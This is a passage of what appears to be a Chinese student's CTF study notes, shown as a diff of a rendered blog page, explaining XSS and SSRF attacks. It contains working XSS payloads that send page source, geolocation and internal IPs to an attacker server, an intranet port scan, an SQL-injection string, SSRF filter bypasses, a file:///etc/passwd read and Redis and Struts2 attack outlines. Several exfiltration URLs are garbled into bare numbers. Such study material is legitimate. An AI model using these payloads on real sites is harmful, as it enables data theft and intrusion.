 <li><p>获取网页源码。这是XSS攻击中比较简单但也比较有用的一种技术。通过XSS注入一些JavaScript代码到网页中，就可以获取到网页的源码，并将其发送给攻击者。这样就可以窥探网站的内部结构和逻辑，或者发现一些隐藏的信息和功能。例如，如果一个网站存在反射型XSS漏洞，攻击者可以构造一个包含如下代码的恶意链接：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>, <span class="literal">true</span>); xhr.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;<span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>(); img.<span class="property">src</span> = <span class="string">&quot;7 + encodeURIComponent(xhr.responseText);&#125;; xhr.send();</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这段代码会创建一个XMLHttpRequest对象，并向当前页面发送一个GET请求。当请求完成后，就会将响应内容（即网页源码）作为参数传递给一个恶意网站的地址，并创建一个隐藏的图片元素来发送请求。这样就可以将网页源码泄露给攻击者。</p>
-</li>
-<li><p>发起HTTP请求。这是XSS攻击中非常强大和危险的一种技术。通过XSS注入一些JavaScript代码到网页中，就可以利用浏览器作为代理，向任何目标发起HTTP请求。这样就可以绕过<strong>同源策略</strong>（Same Origin Policy）(同源策略是浏览器的一种安全机制，它限制了不同源的网页之间的交互。例如，一个网页不能通过JavaScript访问另一个网页的内容，除非它们属于同一个源。源是由协议、域名和端口号组成的，只有当这三个部分完全相同的时候，两个网页才被认为是同源的。这样可以防止恶意网站窃取用户的数据或执行一些有害的操作。同源策略主要针对的是脚本的访问，而不是资源的嵌入。也就是说，你可以在一个网页中使用<code>&lt;img&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;link&gt;</code>等标签来嵌入不同源的图片、脚本、样式等资源，但是你不能通过XMLHttpRequest或fetch等方法来获取不同源的数据，除非对方网站允许了跨源资源共享（CORS）。CORS是一种协议，它可以让服务器指定哪些网站可以访问它的资源，从而放宽同源策略的限制。</p>
-</li>
+<p>这段代码会创建一个XMLHttpRequest对象，并向当前页面发送一个GET请求。当请求完成后，就会将响应内容（即网页源码）作为参数传递给一个恶意网站的地址，并创建一个隐藏的图片元素来发送请求。这样就可以将网页源码泄露给攻击者。</p></li>
+<li><p>发起HTTP请求。这是XSS攻击中非常强大和危险的一种技术。通过XSS注入一些JavaScript代码到网页中，就可以利用浏览器作为代理，向任何目标发起HTTP请求。这样就可以绕过<strong>同源策略</strong>（Same
+Origin
+Policy）(同源策略是浏览器的一种安全机制，它限制了不同源的网页之间的交互。例如，一个网页不能通过JavaScript访问另一个网页的内容，除非它们属于同一个源。源是由协议、域名和端口号组成的，只有当这三个部分完全相同的时候，两个网页才被认为是同源的。这样可以防止恶意网站窃取用户的数据或执行一些有害的操作。同源策略主要针对的是脚本的访问，而不是资源的嵌入。也就是说，你可以在一个网页中使用<code>&lt;img&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;link&gt;</code>等标签来嵌入不同源的图片、脚本、样式等资源，但是你不能通过XMLHttpRequest或fetch等方法来获取不同源的数据，除非对方网站允许了跨源资源共享（CORS）。CORS是一种协议，它可以让服务器指定哪些网站可以访问它的资源，从而放宽同源策略的限制。</p></li>
 <li><p>)，访问一些受限的资源，或者执行一些需要权限的操作。例如，如果一个网站存在存储型XSS漏洞，攻击者可以在留言板上发布一条包含如下代码的留言：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="literal">true</span>); xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>); xhr.<span class="title function_">send</span>(<span class="string">&quot;id=123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这段代码会创建一个XMLHttpRequest对象，并向一个管理后台的地址发送一个POST请求，试图删除一个id为123的记录。如果用户在浏览这条留言时已经登录了管理后台，那么这个请求就会带上用户的cookie信息，并可能成功执行删除操作。这样就可以利用用户的权限来进行一些恶意的操作。</p>
-</li>
-<li><p>使用HTML5 Geolocation API获取地理位置信息。这是XSS攻击中利用HTML5新特性的一种技术。通过XSS注入一些JavaScript代码到网页中，就可以利用Geolocation API来获取用户的地理位置信息，并将其发送给攻击者。这样就可以追踪用户的位置，或者进行一些基于位置的服务或攻击。例如，如果一个网站存在反射型XSS漏洞，攻击者可以构造一个包含如下代码的恶意链接：</p>
+<p>这段代码会创建一个XMLHttpRequest对象，并向一个管理后台的地址发送一个POST请求，试图删除一个id为123的记录。如果用户在浏览这条留言时已经登录了管理后台，那么这个请求就会带上用户的cookie信息，并可能成功执行删除操作。这样就可以利用用户的权限来进行一些恶意的操作。</p></li>
+<li><p>使用HTML5 Geolocation
+API获取地理位置信息。这是XSS攻击中利用HTML5新特性的一种技术。通过XSS注入一些JavaScript代码到网页中，就可以利用Geolocation
+API来获取用户的地理位置信息，并将其发送给攻击者。这样就可以追踪用户的位置，或者进行一些基于位置的服务或攻击。例如，如果一个网站存在反射型XSS漏洞，攻击者可以构造一个包含如下代码的恶意链接：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">if</span> (navigator.<span class="property">geolocation</span>) &#123;navigator.<span class="property">geolocation</span>.<span class="title function_">getCurrentPosition</span>(<span class="keyword">function</span>(<span class="params">position</span>) &#123;<span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>(); img.<span class="property">src</span> = <span class="string">&quot;9 + position.coords.latitude + &quot;</span>&amp;lon=<span class="string">&quot; + position.coords.longitude;&#125;);&#125;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这段代码会检测浏览器是否支持Geolocation API，如果支持，就会调用getCurrentPosition方法来获取用户的当前位置。当获取成功后，就会将位置信息作为参数传递给一个恶意网站的地址，并创建一个隐藏的图片元素来发送请求。这样就可以将用户的位置信息泄露给攻击者。</p>
-</li>
-<li><p>使用WebRTC API获取<strong>内网IP地址</strong>。这是XSS攻击中利用WebRTC新特性的一种技术。通过XSS注入一些JavaScript代码到网页中，就可以利用WebRTC API来获取用户的内网IP地址，并将其发送给攻击者。这样就可以探测用户所在的内网环境，或者进行一些针对内网的攻击。例如，如果一个网站存在反射型XSS漏洞，攻击者可以构造一个包含如下代码的恶意链接：</p>
+<p>这段代码会检测浏览器是否支持Geolocation
+API，如果支持，就会调用getCurrentPosition方法来获取用户的当前位置。当获取成功后，就会将位置信息作为参数传递给一个恶意网站的地址，并创建一个隐藏的图片元素来发送请求。这样就可以将用户的位置信息泄露给攻击者。</p></li>
+<li><p>使用WebRTC
+API获取<strong>内网IP地址</strong>。这是XSS攻击中利用WebRTC新特性的一种技术。通过XSS注入一些JavaScript代码到网页中，就可以利用WebRTC
+API来获取用户的内网IP地址，并将其发送给攻击者。这样就可以探测用户所在的内网环境，或者进行一些针对内网的攻击。例如，如果一个网站存在反射型XSS漏洞，攻击者可以构造一个包含如下代码的恶意链接：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> pc = <span class="keyword">new</span> <span class="title class_">RTCPeerConnection</span>(&#123;<span class="attr">iceServers</span>: []&#125;); pc.<span class="title function_">createDataChannel</span>(<span class="string">&quot;&quot;</span>); pc.<span class="title function_">createOffer</span>().<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">offer</span>) &#123;pc.<span class="title function_">setLocalDescription</span>(offer)&#125;); pc.<span class="property">onicecandidate</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;<span class="keyword">if</span> (event &amp;&amp; event.<span class="property">candidate</span> &amp;&amp; event.<span class="property">candidate</span>.<span class="property">candidate</span>) &#123;<span class="keyword">var</span> ip = event.<span class="property">candidate</span>.<span class="property">candidate</span>.<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>)[<span class="number">4</span>]; <span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>(); img.<span class="property">src</span> = <span class="string">&quot;10 + ip;&#125;&#125;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>代码解释：</p>
 <ul>
-<li><p><code>var pc = new RTCPeerConnection(&#123;iceServers: []&#125;)</code>; 这一行创建了一个新的RTCPeerConnection对象，它表示一个WebRTC连接，用于在本地和远程之间传输音视频或数据。参数中的{iceServers: []}表示一个空的ICE服务器列表，ICE是一种用于在网络地址转换（NAT）后面的设备之间建立连接的协议，它需要一些服务器来协助发现和交换候选地址。这里使用空列表是为了只获取内网IP地址，而不考虑公网IP地址。</p>
-</li>
-<li><p><code>pc.createDataChannel(&quot;&quot;)</code>; 这一行创建了一个数据通道，它是一种用于在WebRTC连接上传输任意数据的双向通道。参数中的””表示数据通道的标签，用于区分不同的数据通道，这里使用空字符串是为了简化代码。</p>
-</li>
-<li><p><code>pc.createOffer().then(function(offer) &#123;pc.setLocalDescription(offer)&#125;)</code>; 这一行创建了一个offer，它是一种用于描述本地设备的音视频或数据能力和配置的对象，它包含了SDP（会话描述协议）格式的信息。创建offer后，就调用pc.setLocalDescription(offer)方法，将offer设置为本地描述，这样就可以开始收集候选地址，并触发onicecandidate事件。</p>
-</li>
-<li><p><code>pc.onicecandidate = function(event) &#123;if (event &amp;&amp; event.candidate &amp;&amp; event.candidate.candidate) &#123;var ip = event.candidate.candidate.split(&quot; &quot;)[4]; var img = new Image(); img.src = &quot;10 + ip;&#125;&#125;</code> 这一行定义了一个函数，用于处理onicecandidate事件，这个事件在每次收集到一个候选地址时都会触发。参数中的event对象包含了一个candidate属性，它是一个RTCIceCandidate对象，表示一个候选地址。如果event.candidate存在，就从中提取出IP地址，它是一个字符串，格式为<code>&quot;candidate:1 1 udp 2122260223 192.168.0.1 59713 typ host generation 0&quot;</code>，其中第五个空格分隔的部分就是IP地址。然后创建一个隐藏的图片元素，并将其src属性设置为一个恶意网站的地址，同时将IP地址作为参数传递过去。这样就可以利用浏览器向恶意网站发送一个请求，并泄露用户的内网IP地址。</p>
-</li>
+<li><p><code>var pc = new RTCPeerConnection(&#123;iceServers: []&#125;)</code>;
+这一行创建了一个新的RTCPeerConnection对象，它表示一个WebRTC连接，用于在本地和远程之间传输音视频或数据。参数中的{iceServers:
+[]}表示一个空的ICE服务器列表，ICE是一种用于在网络地址转换（NAT）后面的设备之间建立连接的协议，它需要一些服务器来协助发现和交换候选地址。这里使用空列表是为了只获取内网IP地址，而不考虑公网IP地址。</p></li>
+<li><p><code>pc.createDataChannel("")</code>;
+这一行创建了一个数据通道，它是一种用于在WebRTC连接上传输任意数据的双向通道。参数中的""表示数据通道的标签，用于区分不同的数据通道，这里使用空字符串是为了简化代码。</p></li>
+<li><p><code>pc.createOffer().then(function(offer) &#123;pc.setLocalDescription(offer)&#125;)</code>;
+这一行创建了一个offer，它是一种用于描述本地设备的音视频或数据能力和配置的对象，它包含了SDP（会话描述协议）格式的信息。创建offer后，就调用pc.setLocalDescription(offer)方法，将offer设置为本地描述，这样就可以开始收集候选地址，并触发onicecandidate事件。</p></li>
+<li><p><code>pc.onicecandidate = function(event) &#123;if (event &amp;&amp; event.candidate &amp;&amp; event.candidate.candidate) &#123;var ip = event.candidate.candidate.split(" ")[4]; var img = new Image(); img.src = "10 + ip;&#125;&#125;</code>
+这一行定义了一个函数，用于处理onicecandidate事件，这个事件在每次收集到一个候选地址时都会触发。参数中的event对象包含了一个candidate属性，它是一个RTCIceCandidate对象，表示一个候选地址。如果event.candidate存在，就从中提取出IP地址，它是一个字符串，格式为<code>"candidate:1 1 udp 2122260223 192.168.0.1 59713 typ host generation 0"</code>，其中第五个空格分隔的部分就是IP地址。然后创建一个隐藏的图片元素，并将其src属性设置为一个恶意网站的地址，同时将IP地址作为参数传递过去。这样就可以利用浏览器向恶意网站发送一个请求，并泄露用户的内网IP地址。</p></li>
 </ul>
-<p>这段代码会创建一个RTCPeerConnection对象，并设置一个空的ICE服务器列表。然后创建一个数据通道，并生成一个offer。当生成offer后，就会触发onicecandidate事件，从而获取到候选IP地址。如果获取到了内网IP地址，就会将其作为参数传递给一个恶意网站的地址，并创建一个隐藏的图片元素来发送请求。这样就可以将用户的内网IP地址泄露给攻击者。</p>
-</li>
+<p>这段代码会创建一个RTCPeerConnection对象，并设置一个空的ICE服务器列表。然后创建一个数据通道，并生成一个offer。当生成offer后，就会触发onicecandidate事件，从而获取到候选IP地址。如果获取到了内网IP地址，就会将其作为参数传递给一个恶意网站的地址，并创建一个隐藏的图片元素来发送请求。这样就可以将用户的内网IP地址泄露给攻击者。</p></li>
 <li><p>发起HTTP请求对内网主机进行扫描，对存在漏洞的主机进行攻击。这是XSS攻击中利用浏览器作为代理进行内网渗透的一种技术。通过XSS注入一些JavaScript代码到网页中，就可以利用浏览器发起HTTP请求对内网主机进行扫描，判断其是否存活和开放了哪些端口。然后根据扫描结果，对存在漏洞的主机进行进一步的攻击。例如，如果一个网站存在反射型XSS漏洞，攻击者可以构造一个包含如下代码的恶意链接：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> ips = [<span class="string">&quot;192.168.0.1&quot;</span>, <span class="string">&quot;192.168.0.2&quot;</span>, <span class="string">&quot;192.168.0.3&quot;</span>]; <span class="keyword">var</span> ports = [<span class="number">80</span>, <span class="number">8080</span>, <span class="number">443</span>]; <span class="keyword">var</span> results = []; <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ips.<span class="property">length</span>; i++) &#123;<span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; ports.<span class="property">length</span>; j++) &#123;<span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>(); img.<span class="property">src</span> = <span class="string">&quot;http://&quot;</span> + ips[i] + <span class="string">&quot;:&quot;</span> + ports[j]; img.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;results.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="property">src</span> + <span class="string">&quot; is not reachable&quot;</span>);&#125;; img.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;results.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="property">src</span> + <span class="string">&quot; is reachable&quot;</span>);&#125;;&#125;&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>这段代码会创建一个内网IP地址和端口的数组，并循环遍历它们，创建一个隐藏的图片元素，将其src属性设置为内网主机的地址和端口。<strong>如果图片加载失败，说明该主机或端口不可达；如果图片加载成功，说明该主机或端口可达</strong>。这样就可以利用浏览器对内网主机进行扫描，并将扫描结果存储在一个数组中。然后，攻击者可以利用其他方法，如Ajax或WebSocket，将这个数组发送给自己的服务器，从而获取到内网主机的存活和开放情况。接下来，攻击者可以根据扫描结果，对存在漏洞的主机进行进一步的攻击。例如，如果发现某个主机开放了80端口，并且运行了一个存在SQL注入漏洞的网站，攻击者可以构造一个包含如下代码的恶意链接：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://192.168.0.1:80/index.php?id=1&#x27; or 1=1 -- &quot;</span>, <span class="literal">true</span>); xhr.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;<span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>(); img.<span class="property">src</span> = <span class="string">&quot;11 + encodeURIComponent(xhr.responseText);&#125;; xhr.send();</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这段代码会创建一个XMLHttpRequest对象，并向内网主机的80端口发送一个GET请求，其中包含了一个SQL注入语句。当请求完成后，就会将响应内容（即数据库中的所有数据）作为参数传递给一个恶意网站的地址，并创建一个隐藏的图片元素来发送请求。这样就可以利用浏览器对内网主机进行SQL注入攻击，并将数据库中的数据泄露给攻击者。</p>
-</li>
+<p>这段代码会创建一个XMLHttpRequest对象，并向内网主机的80端口发送一个GET请求，其中包含了一个SQL注入语句。当请求完成后，就会将响应内容（即数据库中的所有数据）作为参数传递给一个恶意网站的地址，并创建一个隐藏的图片元素来发送请求。这样就可以利用浏览器对内网主机进行SQL注入攻击，并将数据库中的数据泄露给攻击者。</p></li>
 </ul>
-<h2 id="第四章-服务端请求伪造-SSRF"><a href="#第四章-服务端请求伪造-SSRF" class="headerlink" title="第四章 服务端请求伪造(SSRF)"></a>第四章 服务端请求伪造(SSRF)</h2><h3 id="如何形成"><a href="#如何形成" class="headerlink" title="如何形成"></a>如何形成</h3><p>由于服务端提供了从其他服务器或应用中获取数据的功能，但没有对目标地址作出有效的过滤和限制造成的。例如，服务端可能需要从用户指定的URL地址获取网页文本内容，加载指定地址的图片，或者调用第三方的API等。如果用户可以控制这些URL地址，那么他们就可能利用这个功能来访问一些正常情况下无法访问的资源，比如内网的服务，或者外网的敏感信息</p>
-<h3 id="防护绕过"><a href="#防护绕过" class="headerlink" title="防护绕过"></a>防护绕过</h3><h4 id="过滤体现"><a href="#过滤体现" class="headerlink" title="过滤体现"></a>过滤体现</h4><ul>
+<h2 id="第四章-服务端请求伪造ssrf">第四章 服务端请求伪造(SSRF)</h2>
+<h3 id="如何形成">如何形成</h3>
+<p>由于服务端提供了从其他服务器或应用中获取数据的功能，但没有对目标地址作出有效的过滤和限制造成的。例如，服务端可能需要从用户指定的URL地址获取网页文本内容，加载指定地址的图片，或者调用第三方的API等。如果用户可以控制这些URL地址，那么他们就可能利用这个功能来访问一些正常情况下无法访问的资源，比如内网的服务，或者外网的敏感信息</p>
+<h3 id="防护绕过">防护绕过</h3>
+<h4 id="过滤体现">过滤体现</h4>
+<ul>
 <li>限制请求特定域名</li>
 <li>禁止请求内网IP</li>
 <li>禁止请求特定协议（如file、gopher、dict等）</li>
 <li>对请求结果进行安全检查（如HTML转义、文件类型检测等）</li>
 </ul>
-<h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><ul>
+<h4 id="绕过-1">绕过</h4>
+<ul>
 <li>使用<code>http://example.com@evil.com</code>这种格式来绕过正则</li>
 <li>IP地址转为进制（八进制、十进制、十六进制）及IP地址省略写法</li>
 <li>配置域名</li>
 </ul>
-<h3 id="危害与利用技巧-1"><a href="#危害与利用技巧-1" class="headerlink" title="危害与利用技巧"></a>危害与利用技巧</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>可通过应用响应时间、返回的错误信息、返回的服务<strong>Banner类</strong>判断端口是否开放</p>
-<p>返回的服务Banner类判断端口是否开放：是一种利用服务端返回的一些信息来判断目标主机上某个端口是否运行了某种服务的方法。服务Banner是一种服务端在与客户端建立连接时发送的欢迎信息，通常包含了服务的类型、版本、开发商等信息。例如，如果您访问一个网站，那么网站服务器可能会返回一个类似于HTTP&#x2F;1.1 200 OK的Banner，表示该服务器使用了HTTP协议，版本是1.1，状态码是200，表示请求成功。</p>
-<p>通过获取服务Banner，可以对目标主机上的服务进行识别和分析，从而发现一些潜在的漏洞和弱点。例如，如果一个服务器返回了SSH-2.0-OpenSSH_5.3的Banner，表示该服务器运行了SSH服务，版本是OpenSSH 5.3。那么我们就可以根据这个版本号来查找是否存在已知的漏洞，并尝试利用它们来攻击该服务器。</p>
+<h3 id="危害与利用技巧-1">危害与利用技巧</h3>
+<h4 id="端口扫描">端口扫描</h4>
+<p>可通过应用响应时间、返回的错误信息、返回的服务<strong>Banner类</strong>判断端口是否开放</p>
+<p>返回的服务Banner类判断端口是否开放：是一种利用服务端返回的一些信息来判断目标主机上某个端口是否运行了某种服务的方法。服务Banner是一种服务端在与客户端建立连接时发送的欢迎信息，通常包含了服务的类型、版本、开发商等信息。例如，如果您访问一个网站，那么网站服务器可能会返回一个类似于HTTP/1.1
+200
+OK的Banner，表示该服务器使用了HTTP协议，版本是1.1，状态码是200，表示请求成功。</p>
+<p>通过获取服务Banner，可以对目标主机上的服务进行识别和分析，从而发现一些潜在的漏洞和弱点。例如，如果一个服务器返回了SSH-2.0-OpenSSH_5.3的Banner，表示该服务器运行了SSH服务，版本是OpenSSH
+5.3。那么我们就可以根据这个版本号来查找是否存在已知的漏洞，并尝试利用它们来攻击该服务器。</p>
 <p>有一些工具可以帮助我们进行服务Banner的获取和分析，例如nc、python、dmitry、nmap、amap等。这些工具可以通过发送特定的数据包到目标主机上的指定端口，并接收返回的数据包来获取服务Banner。然后根据服务Banner中的特征信息来判断端口是否开放，以及开放的端口上运行了什么样的服务。</p>
-<h4 id="攻击内网或者本地存在漏洞的服务（如缓冲区溢出）"><a href="#攻击内网或者本地存在漏洞的服务（如缓冲区溢出）" class="headerlink" title="攻击内网或者本地存在漏洞的服务（如缓冲区溢出）"></a>攻击内网或者本地存在漏洞的服务（如缓冲区溢出）</h4><p>SSRF是一种利用服务器端的功能来发起请求的攻击，这些请求可能会访问到一些正常情况下无法访问的资源，比如内网的服务，或者外网的敏感信息。如果内网或本地的服务存在一些漏洞，那么攻击者可以通过SSRF来触发这些漏洞，从而实现任意代码执行或其他攻击目标。</p>
+<h4 id="攻击内网或者本地存在漏洞的服务如缓冲区溢出">攻击内网或者本地存在漏洞的服务（如缓冲区溢出）</h4>
+<p>SSRF是一种利用服务器端的功能来发起请求的攻击，这些请求可能会访问到一些正常情况下无法访问的资源，比如内网的服务，或者外网的敏感信息。如果内网或本地的服务存在一些漏洞，那么攻击者可以通过SSRF来触发这些漏洞，从而实现任意代码执行或其他攻击目标。</p>
 <p>例如：如果内网的Redis服务没有设置密码，并且开启了<strong>主从复制</strong>功能，那么可以通过SSRF来写入恶意数据，并利用<strong>Redis</strong>主从复制机制来执行恶意命令。具体的过程如下：</p>
 <ul>
 <li>攻击者首先找到一个可以利用SSRF的漏洞点，比如一个可以指定URL地址的参数。</li>
@@ -474,18 +572,22 @@
 </ul>
 <p><strong>主从复制</strong>是一种数据备份和分布式处理的技术，它可以让一个数据库服务器（称为主服务器）的数据自动复制到另一个或多个数据库服务器（称为从服务器）上。这样，主服务器可以负责写入数据，而从服务器可以负责读取数据，从而提高数据的可用性和性能。主从复制也可以用于故障恢复和负载均衡。</p>
 <p><strong>Redis</strong>是一种开源的、基于内存的、非关系型的数据库，它支持多种数据结构，如字符串、哈希、列表、集合、有序集合等。Redis也支持主从复制，可以让一个Redis服务器（称为主节点）的数据复制到其他的Redis服务器（称为从节点）上。Redis的主从复制是异步的，也就是说，主节点不会等待从节点的回应就可以继续处理其他请求。Redis的主从复制可以实现数据的冗余、故障恢复、负载均衡和高可用性。</p>
-<h4 id="对内网web应用进行指纹识别及攻击其中存在漏洞的应用"><a href="#对内网web应用进行指纹识别及攻击其中存在漏洞的应用" class="headerlink" title="对内网web应用进行指纹识别及攻击其中存在漏洞的应用"></a>对内网web应用进行指纹识别及攻击其中存在漏洞的应用</h4><p>例如，如果内网中有一个Struts2框架搭建的web应用，并且存在S2-045漏洞，那么可以通过SSRF来构造恶意请求头，并触发远程代码执行。具体的过程如下：</p>
+<h4 id="对内网web应用进行指纹识别及攻击其中存在漏洞的应用">对内网web应用进行指纹识别及攻击其中存在漏洞的应用</h4>
+<p>例如，如果内网中有一个Struts2框架搭建的web应用，并且存在S2-045漏洞，那么可以通过SSRF来构造恶意请求头，并触发远程代码执行。具体的过程如下：</p>
 <ul>
 <li>首先，我们需要找到一个可以利用SSRF的漏洞点，比如一个可以指定URL地址的参数。假设这个参数是url，并且我们知道内网中Struts2应用的地址是<code>http://192.168.1.100:8080/index.action</code>。</li>
 <li>然后，我们可以构造一个特殊的URL地址，使用file协议，并在URL中包含Windows系统的配置文件win.ini。这样，我们就可以通过SSRF来读取服务器上的文件内容。例如，我们可以访问<code>http://payloads.net/ssrf.php?url=file:///c:/windows/win.ini</code>。</li>
-<li>接着，我们可以修改HTTP请求头中的Content-Type值，利用S2-045漏洞中的OGNL表达式来执行系统命令。例如，我们可以执行whoami命令来获取当前用户的身份。我们可以使用Burp Suite等工具来修改请求头，并发送请求。</li>
+<li>接着，我们可以修改HTTP请求头中的Content-Type值，利用S2-045漏洞中的OGNL表达式来执行系统命令。例如，我们可以执行whoami命令来获取当前用户的身份。我们可以使用Burp
+Suite等工具来修改请求头，并发送请求。</li>
 <li>最后，我们可以在响应中看到执行结果，证明我们成功利用了SSRF和S2-045漏洞来攻击内网中的Struts2应用。</li>
 </ul>
-<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>如果攻击者指定了file协议，可通过file协议来读取服务器上的文件内容：</p>
+<h4 id="文件读取">文件读取</h4>
+<p>如果攻击者指定了file协议，可通过file协议来读取服务器上的文件内容：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssfr.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>
-
-<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>php环境如果安装了except扩展，可通过except协议执行系统命令</p>
-<h2 id="第五章-利用特性进行攻击"><a href="#第五章-利用特性进行攻击" class="headerlink" title="第五章 利用特性进行攻击"></a>第五章 利用特性进行攻击</h2></div><div class="article-licensing box"><div class="licensing-title"><p>ctf特训营笔记</p><p><a href="http://example.com/post/392e8386.html">http://example.com/post/392e8386.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>yyyyyyxnp</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2023-07-31</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2024-09-29</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="notification is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>Afdian.net</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>Alipay</span><span class="qrcode"><img src="/" alt="Alipay"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>Buy me a coffee</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><div class="notification is-danger">You forgot to set the <code>business</code> or <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.</div><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="/" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/post/266d9ac.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">leetcode100题_2</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/post/b4fd5249.html"><span class="level-item">菜鸟的ctf之旅(ctfhub技能树)</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="notification is-danger">You forgot to set the <code>shortname</code> for Disqus. Please set it in <code>_config.yml</code>.</div></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/avatar.png" alt="Yyyyyyxnp"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Yyyyyyxnp</p><p class="is-size-6 is-block">Student 